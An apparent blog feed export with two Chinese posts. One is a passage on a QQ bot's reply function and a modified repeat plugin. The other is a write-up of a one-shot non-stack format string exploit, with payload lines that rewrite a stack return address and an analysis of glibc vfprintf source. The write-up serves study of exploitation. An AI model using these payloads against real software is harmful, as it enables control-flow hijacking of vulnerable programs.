class="keyword">if</span> (quote &amp;&amp; e.<span class="property">message_id</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title class_">Array</span>.<span class="title function_">isArray</span>(msg))</span><br><span class="line">          msg.<span class="title function_">unshift</span>(segment.<span class="title function_">reply</span>(e.<span class="property">message_id</span>))</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">          msg = [segment.<span class="title function_">reply</span>(e.<span class="property">message_id</span>), msg]</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">let</span> res</span><br><span class="line">      <span class="keyword">try</span> &#123;</span><br><span class="line">        res = <span class="keyword">await</span> <span class="title function_">reply</span>(msg)</span><br><span class="line">      &#125; <span class="keyword">catch</span> (err) &#123;</span><br><span class="line">        <span class="title class_">Bot</span>.<span class="title function_">makeLog</span>(<span class="string">&quot;error&quot;</span>, [<span class="string">&quot;发送消息错误&quot;</span>, msg, err], e.<span class="property">self_id</span>)</span><br><span class="line">        res = &#123; <span class="attr">error</span>: [err] &#125;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (recallMsg &gt; <span class="number">0</span> &amp;&amp; res?.<span class="property">message_id</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (e.<span class="property">group</span>?.<span class="property">recallMsg</span>)</span><br><span class="line">          <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">            e.<span class="property">group</span>.<span class="title function_">recallMsg</span>(res.<span class="property">message_id</span>)</span><br><span class="line">            <span class="keyword">if</span> (e.<span class="property">message_id</span>)</span><br><span class="line">              e.<span class="property">group</span>.<span class="title function_">recallMsg</span>(e.<span class="property">message_id</span>)</span><br><span class="line">          &#125;, recallMsg * <span class="number">1000</span>)</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (e.<span class="property">friend</span>?.<span class="property">recallMsg</span>)</span><br><span class="line">          <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">            e.<span class="property">friend</span>.<span class="title function_">recallMsg</span>(res.<span class="property">message_id</span>)</span><br><span class="line">            <span class="keyword">if</span> (e.<span class="property">message_id</span>)</span><br><span class="line">              e.<span class="property">friend</span>.<span class="title function_">recallMsg</span>(e.<span class="property">message_id</span>)</span><br><span class="line">          &#125;, recallMsg * <span class="number">1000</span>)</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="variable language_">this</span>.<span class="title function_">count</span>(e, <span class="string">&quot;send&quot;</span>, msg)</span><br><span class="line">      <span class="keyword">return</span> res</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></div>

<h6 id="函数参数"><a href="#函数参数" class="headerlink" title="函数参数"></a>函数参数</h6><div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="title function_">async</span> (msg = <span class="string">&quot;&quot;</span>, quote = <span class="literal">false</span>, data = &#123;&#125;)</span><br></pre></td></tr></table></figure></div>

<ul>
<li><p><code>msg</code>: 要发送的消息，默认值是空字符串。</p>
</li>
<li><p><code>quote</code>: 是否引用消息（通常用于回复特定消息），默认值为 <code>false</code>。</p>
</li>
<li><p><code>data</code>: 一个对象，包含额外的选项，包括：</p>
<ul>
<li><code>recallMsg</code>: 是否自动撤回消息，单位是秒（默认值为 <code>0</code>，即不撤回）。</li>
<li><code>at</code>: 是否 @ 某人。可以是用户 ID，也可以是 <code>true</code>（表示 @ 当前消息发送者）。</li>
</ul>
</li>
</ul>
<hr>
<h6 id="at-和-quote-功能的处理"><a href="#at-和-quote-功能的处理" class="headerlink" title="at 和 quote 功能的处理"></a><strong><code>at</code> 和 <code>quote</code> 功能的处理</strong></h6><p><strong>@ 功能 (<code>at</code>)</strong></p>
<div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (at &amp;&amp; e.<span class="property">isGroup</span>) &#123;</span><br><span class="line">  <span class="keyword">if</span> (at === <span class="literal">true</span>)</span><br><span class="line">    at = e.<span class="property">user_id</span></span><br><span class="line">  <span class="keyword">if</span> (<span class="title class_">Array</span>.<span class="title function_">isArray</span>(msg))</span><br><span class="line">    msg.<span class="title function_">unshift</span>(segment.<span class="title function_">at</span>(at), <span class="string">&quot;\n&quot;</span>)</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    msg = [segment.<span class="title function_">at</span>(at), <span class="string">&quot;\n&quot;</span>, msg]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<ul>
<li><p>如果传入了 <code>at</code>且当前消息是群消息：</p>
<ul>
<li>如果 <code>at === true</code>，则默认 @ 当前用户 <code>e.user_id</code>。</li>
<li>如果消息内容是数组，会在数组前添加 <code>@</code> 信息和换行符。</li>
<li>如果消息是普通文本，则将消息包装成一个数组并加上 <code>@</code> 信息。</li>
</ul>
</li>
</ul>
<hr>
<p><strong>引用消息 (<code>quote</code>)</strong></p>
<div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (quote &amp;&amp; e.<span class="property">message_id</span>) &#123;</span><br><span class="line">  <span class="keyword">if</span> (<span class="title class_">Array</span>.<span class="title function_">isArray</span>(msg))</span><br><span class="line">    msg.<span class="title function_">unshift</span>(segment.<span class="title function_">reply</span>(e.<span class="property">message_id</span>))</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    msg = [segment.<span class="title function_">reply</span>(e.<span class="property">message_id</span>), msg]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<ul>
<li><p>如果 <code>quote</code>为<code>true</code>且当前事件中有 <code>message_id</code>：</p>
<ul>
<li>在消息前添加一段引用内容（<code>segment.reply(e.message_id)</code>）。</li>
<li>类似 <code>at</code> 的逻辑，会将消息转换为数组格式。</li>
</ul>
</li>
</ul>
<hr>
<h6 id="消息发送与异常处理"><a href="#消息发送与异常处理" class="headerlink" title="消息发送与异常处理"></a><strong>消息发送与异常处理</strong></h6><div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> res</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">  res = <span class="keyword">await</span> <span class="title function_">reply</span>(msg)</span><br><span class="line">&#125; <span class="keyword">catch</span> (err) &#123;</span><br><span class="line">  <span class="title class_">Bot</span>.<span class="title function_">makeLog</span>(<span class="string">&quot;error&quot;</span>, [<span class="string">&quot;发送消息错误&quot;</span>, msg, err], e.<span class="property">self_id</span>)</span><br><span class="line">  res = &#123; <span class="attr">error</span>: [err] &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<ul>
<li>使用 <code>reply(msg)</code> 发送消息。</li>
<li>如果发送失败，会捕获异常，并通过 <code>Bot.makeLog</code> 记录错误日志。</li>
</ul>
<hr>
<h6 id="自动撤回消息"><a href="#自动撤回消息" class="headerlink" title="自动撤回消息"></a><strong>自动撤回消息</strong></h6><div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (recallMsg &gt; <span class="number">0</span> &amp;&amp; res?.<span class="property">message_id</span>) &#123;</span><br><span class="line">  <span class="keyword">if</span> (e.<span class="property">group</span>?.<span class="property">recallMsg</span>)</span><br><span class="line">    <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">      e.<span class="property">group</span>.<span class="title function_">recallMsg</span>(res.<span class="property">message_id</span>)</span><br><span class="line">      <span class="keyword">if</span> (e.<span class="property">message_id</span>)</span><br><span class="line">        e.<span class="property">group</span>.<span class="title function_">recallMsg</span>(e.<span class="property">message_id</span>)</span><br><span class="line">    &#125;, recallMsg * <span class="number">1000</span>)</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (e.<span class="property">friend</span>?.<span class="property">recallMsg</span>)</span><br><span class="line">    <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">      e.<span class="property">friend</span>.<span class="title function_">recallMsg</span>(res.<span class="property">message_id</span>)</span><br><span class="line">      <span class="keyword">if</span> (e.<span class="property">message_id</span>)</span><br><span class="line">        e.<span class="property">friend</span>.<span class="title function_">recallMsg</span>(e.<span class="property">message_id</span>)</span><br><span class="line">    &#125;, recallMsg * <span class="number">1000</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<ul>
<li><p>如果 <code>recallMsg</code> 大于 0 且成功发送了消息（<code>res?.message_id</code>存在）：</p>
<ul>
<li>如果消息是在群聊中发送，调用 <code>e.group.recallMsg</code> 撤回消息。</li>
<li>如果消息是在私聊中发送，调用 <code>e.friend.recallMsg</code> 撤回消息。</li>
<li><code>setTimeout</code> 用来延迟 <code>recallMsg</code> 秒后执行撤回操作。</li>
</ul>
</li>
</ul>
<hr>
<h6 id="统计与返回"><a href="#统计与返回" class="headerlink" title="统计与返回"></a><strong>统计与返回</strong></h6><div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="variable language_">this</span>.<span class="title function_">count</span>(e, <span class="string">&quot;send&quot;</span>, msg)</span><br><span class="line"><span class="keyword">return</span> res</span><br></pre></td></tr></table></figure></div>

<ul>
<li>调用 <code>this.count</code> 方法统计消息发送（如记录发送次数）。</li>
<li>最后返回消息发送的结果 <code>res</code>。</li>
</ul>
<p>这样我们就可以尝试着手实现一个简单的功能改造了，这个自带的复读文件需要我们输入<code>#复读</code>，然后bot回应后我们再输入内容，bot才会复读该内容。那么我们可以尝试将其改造成一个我们@bot后输入复读xxx，然后bot复读xxx的一个功能插件。</p>
<p>在更改的过程中发现了一个严峻的问题，就是其rule中reg的正则匹配只返回了true或false，但并不能捕获分组。这里我们可以在函数体内部再进行一次正则表达的匹配，然后进行输出。</p>
<p>在测试中也发现，我们@bot的这个前缀实际不会出现在e.msg中，只用匹配后面的内容就行。</p>
<p>最终更改结果：</p>
<div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">export</span> <span class="keyword">class</span> <span class="title class_">example2</span> <span class="keyword">extends</span> <span class="title class_ inherited__">plugin</span> &#123;</span><br><span class="line">  <span class="title function_">constructor</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">super</span>(&#123;</span><br><span class="line">      <span class="attr">name</span>: <span class="string">&quot;复读&quot;</span>,</span><br><span class="line">      <span class="attr">dsc</span>: <span class="string">&quot;复读用户发送的内容&quot;</span>,</span><br><span class="line">      <span class="comment">/** https://oicqjs.github.io/oicq/#events */</span></span><br><span class="line">      <span class="attr">event</span>: <span class="string">&quot;message&quot;</span>,</span><br><span class="line">      <span class="attr">priority</span>: <span class="number">5000</span>,</span><br><span class="line">      <span class="attr">rule</span>: [</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="comment">/** 命令正则匹配 */</span></span><br><span class="line">          <span class="attr">reg</span>: <span class="string">&quot;^复读:(.*)$&quot;</span>,</span><br><span class="line">          <span class="comment">/** 执行方法 */</span></span><br><span class="line">          <span class="attr">fnc</span>: <span class="string">&quot;repeat&quot;</span>,</span><br><span class="line">          <span class="attr">permission</span>: <span class="string">&quot;all&quot;</span>,</span><br><span class="line">        &#125;</span><br><span class="line">      ]</span><br><span class="line">    &#125;)</span><br><span class="line">  &#125;</span><br><span class="line">    </span><br><span class="line">  repeat = <span class="title function_">async</span> () =&gt;&#123;</span><br><span class="line">    <span class="comment">// const content = this.e.match[1].trim();</span></span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">this</span>.<span class="property">rule</span>); <span class="comment">// 打印 this.rule 的值</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable language_">this</span>.<span class="property">rule</span> &amp;&amp; <span class="variable language_">this</span>.<span class="property">rule</span>[<span class="number">0</span>] &amp;&amp; <span class="variable language_">this</span>.<span class="property">rule</span>[<span class="number">0</span>].<span class="property">reg</span>) &#123;</span><br><span class="line">      <span class="variable language_">this</span>.<span class="property">rule</span>[<span class="number">0</span>].<span class="property">reg</span> = <span class="keyword">new</span> <span class="title class_">RegExp</span>(<span class="variable language_">this</span>.<span class="property">rule</span>[<span class="number">0</span>].<span class="property">reg</span>);</span><br><span class="line">      <span class="keyword">const</span> match = <span class="variable language_">this</span>.<span class="property">rule</span>[<span class="number">0</span>].<span class="property">reg</span>.<span class="title function_">exec</span>(<span class="variable language_">this</span>.<span class="property">e</span>.<span class="property">msg</span>);</span><br><span class="line">      <span class="variable language_">console</span>.<span class="title function_">log</span>(match);</span><br><span class="line">      <span class="keyword">if</span> (match) &#123;</span><br><span class="line">        <span class="keyword">const</span> content = match[<span class="number">1</span>].<span class="title function_">trim</span>();</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="title function_">reply</span>(content, <span class="literal">false</span>, &#123; <span class="attr">at</span>: <span class="literal">true</span> &#125;);</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">error</span>(<span class="string">&quot;No match found&quot;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="variable language_">console</span>.<span class="title function_">error</span>(<span class="string">&quot;rule or reg is undefined&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

]]></content>
      <categories>
        <category>qqbot</category>
      </categories>
      <tags>
        <tag>yunzai</tag>
        <tag>JS</tag>
        <tag>OneBot</tag>
      </tags>
  </entry>
  <entry>
    <title>非栈上格式化字符串一次利用</title>
    <url>/blog/2024/10/02/%E9%9D%9E%E6%A0%88%E4%B8%8A%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E4%B8%80%E6%AC%A1%E5%88%A9%E7%94%A8/</url>
    <content><![CDATA[<h4 id="问题发展路径"><a href="#问题发展路径" class="headerlink" title="问题发展路径"></a>问题发展路径</h4><ul>
<li>一开始最基本的格式化字符串漏洞任意地址写，没有什么限制</li>
<li>进阶一点的是非栈上的格式化字符串漏洞利用，需要利用到栈上的指向程序名称的链条以及靠近内核区域的链条，但这种方法正常而言需要多次格式化字符串漏洞的执行利用，对目标地址改动越大需要利用到越多次。</li>
<li>最后是在读取内容非栈上的情况下，实现在一次格式化字符串漏洞的触发中直接进行对一个栈上地址的两个字节的修改，可以用于减少利用格式化字符串漏洞的次数，绕过更多的限制。</li>
</ul>
<h4 id="实现原理"><a href="#实现原理" class="headerlink" title="实现原理"></a>实现原理</h4><p>比如我们假设程序中有后门函数，目标是把栈上的返回地址的后两个字节给覆盖了以实现返回到后门函数中去。其中要利用到的两个链条的偏移分别为15和45。按照一般的多次漏洞的利用来说，是要先通过覆盖偏移15处的<code>0x7ffd991d220e</code>的低两个字节<code>0x220e</code>为<code>0x1898</code>，这样以后在r12指向的偏移45处就会是一个指针直接指向要返回到的地址，然后再通过写偏移45处内容的低两个字节实现对返回地址的低两个字节的写入。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/10/02/%E9%9D%9E%E6%A0%88%E4%B8%8A%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E4%B8%80%E6%AC%A1%E5%88%A9%E7%94%A8/image-20241001001143123.png"
                      class=""
                >

<p>这里我们很容易就想到尝试直接把两个并到一起写，就有了如下payload：</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">payload = <span class="string">f&quot;%<span class="subst">&#123;part1&#125;</span>c%15$hn&quot;</span> + <span class="string">f&quot;%<span class="subst">&#123;part2&#125;</span>c%45$hn&quot;</span></span><br></pre></td></tr></table></figure></div>

<p>但在实际调试过后会发现现实的残酷，这个格式化字符串的解析中并不是按照先来后到的顺序，先解析完前一个再解析后一个的。实际上这里改的内容都是原偏移地址处指针指向的内容，最后并不会对返回地址进行修改。</p>
<p>于是就有如下的比较神奇的绕过方法，就可以通过格式化字符串参数解析的特性来实现逐级的赋值。</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">payload = <span class="string">&quot;%p&quot;</span>*<span class="number">13</span></span><br><span class="line">payload = <span class="string">f&quot;%<span class="subst">&#123;part1-<span class="number">130</span>-<span class="number">0x8</span>&#125;</span>c%hn&quot;</span> + <span class="string">f&quot;%<span class="subst">&#123;part2&#125;</span>c%45$hn&quot;</span></span><br></pre></td></tr></table></figure></div>

<p>这里省略掉了<code>%x$n</code>这种组合，而是直接<code>%hn</code>，这样省略以后会根据顺序来确定指定的参数偏移，由于前面有14个%，这里的%实际就会被解析为指向偏移15处的参数，这样一来在%的解析阶段就能把指定内容写到偏移15的指针处，从而与后面的内容进行联动，实现栈上内容的低两个字节内容的修改。这里part1就是我们通过泄露出栈相关地址后，计算出的返回地址在栈上位置的后两个字节。减去130是前面13个%p打印出的内容长度，最后的减0x8是调试后测出来的差值（这个的确不知道是在哪里多的内容）。</p>
<h4 id="源码分析"><a href="#源码分析" class="headerlink" title="源码分析"></a>源码分析</h4><p>首先在<code>stdio-common/printf.c</code>中可以找到printf的具体实现。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;libioP.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdarg.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">undef</span> printf</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Write formatted output to stdout from the format string FORMAT.  */</span></span><br><span class="line"><span class="comment">/* VARARGS1 */</span></span><br><span class="line"><span class="type">int</span></span><br><span class="line">__printf (<span class="type">const</span> <span class="type">char</span> *format, ...)</span><br><span class="line">&#123;</span><br><span class="line">  va_list arg;				<span class="comment">//声明一个 va_list 类型的变量 arg，用于存储可变参数列表。</span></span><br><span class="line">  <span class="type">int</span> done;					<span class="comment">//写入的字符数或其他状态信息。</span></span><br><span class="line"></span><br><span class="line">  va_start (arg, format);	<span class="comment">//初始化 arg，使其指向可变参数列表的第一个参数。</span></span><br><span class="line">  done = __vfprintf_internal (<span class="built_in">stdout</span>, format, arg, <span class="number">0</span>);</span><br><span class="line">  va_end (arg);				<span class="comment">//清理 arg，以释放相关资源</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> done;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">undef</span> _IO_printf</span></span><br><span class="line">ldbl_strong_alias (__printf, <span class="built_in">printf</span>);</span><br><span class="line">ldbl_strong_alias (__printf, _IO_printf);</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<p>其最核心的功能要到<code>vfprintf.c</code>中去寻找，这里结合gdb带源码调试。</p>
<p>首先会进入ARGCHECK中进行一系列检测，确保格式字符串符合要求。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> ARGCHECK(S, Format) \</span></span><br><span class="line"><span class="meta">  do									      \</span></span><br><span class="line"><span class="meta">    &#123;									      \</span></span><br><span class="line"><span class="meta">      <span class="comment">/* Check file argument for consistence.  */</span>			      \</span></span><br><span class="line"><span class="meta">      CHECK_FILE (S, -1);						 <span class="comment">//检查文件流有效性和状态     \</span></span></span><br><span class="line"><span class="comment"><span class="meta">      if (S-&gt;_flags &amp; _IO_NO_WRITES)			//如果指定文件流不可写就返回错误		      \</span></span></span><br><span class="line"><span class="comment"><span class="meta">	&#123;								      \</span></span></span><br><span class="line"><span class="comment"><span class="meta">	  S-&gt;_flags |= _IO_ERR_SEEN;					      \</span></span></span><br><span class="line"><span class="comment"><span class="meta">	  __set_errno (EBADF);						      \</span></span></span><br><span class="line"><span class="comment"><span class="meta">	  return -1;							      \</span></span></span><br><span class="line"><span class="comment"><span class="meta">	&#125;								      \</span></span></span><br><span class="line"><span class="comment"><span class="meta">      if (Format == NULL)			//如果格式化字符串为空就返回错误			      \</span></span></span><br><span class="line"><span class="comment"><span class="meta">	&#123;								      \</span></span></span><br><span class="line"><span class="comment"><span class="meta">	  __set_errno (EINVAL);						      \</span></span></span><br><span class="line"><span class="comment"><span class="meta">	  return -1;							      \</span></span></span><br><span class="line"><span class="comment"><span class="meta">	&#125;								      \</span></span></span><br><span class="line"><span class="comment"><span class="meta">    &#125; while (0)</span></span></span><br></pre></td></tr></table></figure></div>

<p>然后会检查文件流 <code>s</code> 是否处于无缓冲模式，如果处于无缓冲模式，代码调用一个辅助函数 <code>buffered_vfprintf</code>。这个函数的作用是为该流分配一个局部临时缓冲区，然后重新调用原来的格式化输出函数。这样可以在处理输出时提供一个缓冲层，即使原始流不支持缓冲。这里我们调试时会进到<code>buffered_vfprintf</code>里面，最后实际还会调用回<code>vfprintf</code>。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (UNBUFFERED_P (s))</span><br><span class="line"><span class="comment">/* Use a helper function which will allocate a local temporary buffer</span></span><br><span class="line"><span class="comment">   for the stream and then call us again.  */</span></span><br><span class="line">	<span class="keyword">return</span> buffered_vfprintf (s, format, ap, mode_flags);</span><br></pre></td></tr></table></figure></div>

<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/10/02/%E9%9D%9E%E6%A0%88%E4%B8%8A%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E4%B8%80%E6%AC%A1%E5%88%A9%E7%94%A8/image-20241001102135414.png"
                      class=""
                >

<p>然后会判断代码是否支持宽字符的处理，然后查找格式字符串中的第一个格式说明符。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">ifdef</span> COMPILE_WPRINTF</span></span><br><span class="line">  <span class="comment">/* Find the first format specifier.  */</span></span><br><span class="line">  f = lead_str_end = __find_specwc ((<span class="type">const</span> UCHAR_T *) format);</span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line">  <span class="comment">/* Find the first format specifier.  */</span></span><br><span class="line">  f = lead_str_end = __find_specmb ((<span class="type">const</span> UCHAR_T *) format);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure></div>

<p>后面也有类似的，但是会自增f，用于逐个解析。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Get current character in format string.  */</span></span><br><span class="line">      JUMP (*++f, step0_jumps);</span><br><span class="line">......</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> COMPILE_WPRINTF</span></span><br><span class="line">      f = __find_specwc ((end_of_spec = ++f));</span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line">      f = __find_specmb ((end_of_spec = ++f));</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">      <span class="comment">/* Write the following constant string.  */</span></span><br><span class="line">      outstring (end_of_spec, f - end_of_spec);</span><br></pre></td></tr></table></figure></div>

<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> outstring(String, Len)						\</span></span><br><span class="line"><span class="meta">  do									\</span></span><br><span class="line"><span class="meta">    &#123;									\</span></span><br><span class="line"><span class="meta">      const void *string_ = (String);					\</span></span><br><span class="line"><span class="meta">      done = outstring_func (s, string_, (Len), done);			\</span></span><br><span class="line"><span class="meta">      <span class="keyword">if</span> (done &lt; 0)							\</span></span><br><span class="line"><span class="meta">	goto all_done;							\</span></span><br><span class="line"><span class="meta">    &#125;									\</span></span><br><span class="line"><span class="meta">   while (0)</span></span><br></pre></td></tr></table></figure></div>

<p>我们现在关注那个指向程序名的链条，栈上地址低3位16进制为288。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/10/02/%E9%9D%9E%E6%A0%88%E4%B8%8A%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E4%B8%80%E6%AC%A1%E5%88%A9%E7%94%A8/image-20241001112058996.png"
                      class=""
                >

<p>之后在调试时会发现，f会逐渐自增解析各个格式化字符串中的内容，在解析一串%p时其实不会在每一次outstring中打印内容，而是在解析到<code>%xxxc</code>后一并打印内容出来。之后在解析%hn时，会到这里进行跳转。这里对各种类型修饰符进行了解析</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">  <span class="comment">/* Process &#x27;h&#x27; modifier.  There might another &#x27;h&#x27; following.  */</span></span><br><span class="line">LABEL (mod_half):</span><br><span class="line">  is_short = <span class="number">1</span>;</span><br><span class="line">  JUMP (*++f, step3a_jumps);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Process &#x27;hh&#x27; modifier.  */</span></span><br><span class="line">LABEL (mod_halfhalf):</span><br><span class="line">  is_short = <span class="number">0</span>;</span><br><span class="line">  is_char = <span class="number">1</span>;</span><br><span class="line">  JUMP (*++f, step4_jumps);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Process &#x27;l&#x27; modifier.  There might another &#x27;l&#x27; following.  */</span></span><br><span class="line">LABEL (mod_long):</span><br><span class="line">  is_long = <span class="number">1</span>;</span><br><span class="line">  JUMP (*++f, step3b_jumps);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Process &#x27;L&#x27;, &#x27;q&#x27;, or &#x27;ll&#x27; modifier.  No other modifier is</span></span><br><span class="line"><span class="comment"> allowed to follow.  */</span></span><br><span class="line">LABEL (mod_longlong):</span><br><span class="line">  is_long_double = <span class="number">1</span>;</span><br><span class="line">  is_long = <span class="number">1</span>;</span><br><span class="line">  JUMP (*++f, step4_jumps);</span><br></pre></td></tr></table></figure></div>

<p><strong>处理 <code>h</code> 修饰符</strong>：</p>
<ul>
<li><code>LABEL (mod_half)</code><ul>
<li>当遇到 <code>h</code> 修饰符时，将 <code>is_short</code> 设置为 1，表示后续的参数应被视为 <code>short int</code> 类型。</li>
<li>然后跳转到下一个处理步骤 <code>step3a_jumps</code>，继续解析后续的格式字符。</li>
</ul>
</li>
</ul>
<p><strong>处理 <code>hh</code> 修饰符</strong>：</p>
<ul>
<li><code>LABEL (mod_halfhalf)</code><ul>
<li>当遇到 <code>hh</code> 修饰符时，设置 <code>is_short</code> 为 0，并将 <code>is_char</code> 设置为 1。这表示后续参数将被视为 <code>unsigned char</code> 类型。</li>
<li>跳转到 <code>step4_jumps</code>，继续后续解析。</li>
</ul>
</li>
</ul>
<p><strong>处理 <code>l</code> 修饰符</strong>：</p>
<ul>
<li><code>LABEL (mod_long)</code><ul>
<li>当遇到 <code>l</code> 修饰符时，将 <code>is_long</code> 设置为 1，表示后续的参数应被视为 <code>long int</code> 类型。</li>
<li>跳转到 <code>step3b_jumps</code>，继续解析。</li>
</ul>
</li>
</ul>
<p><strong>处理 <code>L</code>、<code>q</code> 或 <code>ll</code> 修饰符</strong>：</p>
<ul>
<li><code>LABEL (mod_longlong)</code><ul>
<li>当遇到 <code>L</code>、<code>q</code> 或 <code>ll</code> 修饰符时，将 <code>is_long_double</code> 设置为 1，并将 <code>is_long</code> 设置为 1。这表明后续参数应被视为 <code>long double</code> 类型或 <code>long long int</code> 类型。</li>
<li>这个标签后不允许有其他修饰符，因此跳转到 <code>step4_jumps</code>，继续后续解析。</li>
</ul>
</li>
</ul>
<p>解析完成后，我们发现栈上的内容实际已经被修改了，而后面的内容还没有开始解析。所以在%hn这种方式进行解析后会直接写入目标地址。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/10/02/%E9%9D%9E%E6%A0%88%E4%B8%8A%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E4%B8%80%E6%AC%A1%E5%88%A9%E7%94%A8/image-20241001113356649.png"
                      class=""
                >

<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/10/02/%E9%9D%9E%E6%A0%88%E4%B8%8A%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E4%B8%80%E6%AC%A1%E5%88%A9%E7%94%A8/image-20241001113519869.png"
                      class=""
                >

<p>之后解析到$时会跳转到<code>do_positional</code>进行进一步操作，然后会调用printf_positional进行进一步操作。这边如果步过就能直接完成操作了。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (*f == L_(<span class="string">&#x27;$&#x27;</span>))</span><br><span class="line"><span class="comment">/* Oh, oh.  The argument comes from a positional parameter.  */</span></span><br><span class="line">	<span class="keyword">goto</span> do_positional;</span><br><span class="line">JUMP (*f, step1_jumps);</span><br></pre></td></tr></table></figure></div>

